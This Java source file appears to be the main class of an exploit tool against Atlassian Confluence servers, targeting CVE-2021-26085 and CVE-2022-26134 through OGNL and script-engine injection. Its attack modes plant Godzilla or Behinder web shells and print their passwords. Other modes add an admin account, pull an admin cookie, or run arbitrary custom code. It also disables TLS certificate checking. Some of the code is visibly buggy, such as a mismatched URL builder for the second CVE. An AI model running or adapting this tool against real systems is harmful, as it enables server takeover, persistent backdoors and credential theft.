package com.qax.confluence.exp;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;

import com.beust.jcommander.JCommander;

public class Main {
    public static void main(String[] args) throws IOException {
        Command myCommand = new Command();
        JCommander jc = JCommander.newBuilder()
                .addObject(myCommand)
                .build();
        jc.parse(args);

        if (myCommand.help || args.length == 0){
            jc.usage();
            return;
        }
        run(myCommand);
    }

    public static void run(Command command) throws IOException {
        String attack = command.attack;
        String cve = command.cve;
        String url = "";
        HttpURLConnection httpURLConnection = null;
        String code;
        if (attack.equalsIgnoreCase("custom")){
            byte[] bytes = Files.readAllBytes(Paths.get(command.input.getPath()));
            code = Util.getEvalCode(new String(bytes), command.classname);
        }else {
            String attackCode = Util.getMyCustomCode(command.attack);
            code = Util.getEvalCode(attackCode, Util.getMyCustomClassname(command.attack));
        }

        if (cve.equals("cve-2021-26085")){
            code = "queryString=" + code;
            url = CVE_2021_26085(command.url);
        }else if (cve.equals("cve-2022-26134")){
            code = "search=" + code;
            url = CVE_2021_26085(command.url);
        }
        httpURLConnection = request(url, code);
        String result = check(httpURLConnection, url, attack);
        System.out.println(result);
    }

    public static String check(HttpURLConnection httpURLConnection, String url, String attack) throws IOException {
        String result = "";
        // 如果是getCookie class重复定义 拿不到x-options，所以直接反射调用
        if (attack.equals("getCookie")){
            httpURLConnection.getResponseCode();
            String getCookieCode = "queryString=" + Util.getCookieCode();
            httpURLConnection = request(url, getCookieCode);
            String cookie = httpURLConnection.getHeaderField("Set_Admin_Cookie");
            if (!cookie.isEmpty()){
                result = "[*] 成功 cookie是" + cookie;
            }
        }else if ("Success".equals(httpURLConnection.getHeaderField("X-Options"))){
            if(attack.equals("godzilla")){
                result = "[*] 成功\n" +
                        "   pass: Ywdaewyhzcxttp\n" +
                        "   key: Irdyzzbommk\n"+
                        "   header: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36";
            } else if (attack.equals("behinder")) {
                result = "[*] 成功\n" +
                        "   pass: Pjlnjoazvtsq\n" +
                        "   header: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36";
            } else if (attack.equals("addAdmin")) {
                // 执行新增admin
                String adminCode = "queryString=" + Util.addAdmin();
                httpURLConnection = request(url, adminCode);
                httpURLConnection.getResponseCode();
                result = "[*] 成功\n" +
                        "   username: adnim\n"+
                        "   password: admin@qax.com\n";
            } else {
                result = "[*] 成功\n" +
                        "   自定义代码执行成功\n";
            }
        }
        return result;
    }

    public static HttpURLConnection request(String url, String body) throws IOException {

        MiTM.trustAllHttpsCertificates();

        System.setProperty("http.proxyHost", "127.0.0.1");
        System.setProperty("http.proxyPort", "8088");


        HttpURLConnection urlConnection = (HttpURLConnection) new URL(url).openConnection();
        urlConnection.setInstanceFollowRedirects(false);
        urlConnection.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
        urlConnection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36");
        urlConnection.setDoOutput(true);
        urlConnection.setDoInput(true);
        OutputStream outputStream = urlConnection.getOutputStream();
        outputStream.write(body.getBytes());
        outputStream.flush();
        outputStream.close();

        return urlConnection;
    }

    public static String CVE_2021_26085(String url) throws IOException {
        if (!url.endsWith("/")){
            url = url +"/pages/doenterpagevariables.action";
        }
        url += "pages/doenterpagevariables.action";
        return url;
    }

    public static String CVE_2022_26134(String url){
        String payload = "%24%7B%23a%3Dnew%20javax.script.ScriptEngineManager().getEngineByName(%22js%22).eval(%40com.opensymphony.webwork.ServletActionContext%40getRequest().getParameter(%22search%22)).(%40com.opensymphony.webwork.ServletActionContext%40getResponse().setHeader(%22X-Status%22%2C%22ok%22))%7D/";
        if (!url.endsWith("/")){
            url = url + "/";
        }
        url += payload;
        return url;
    }
}
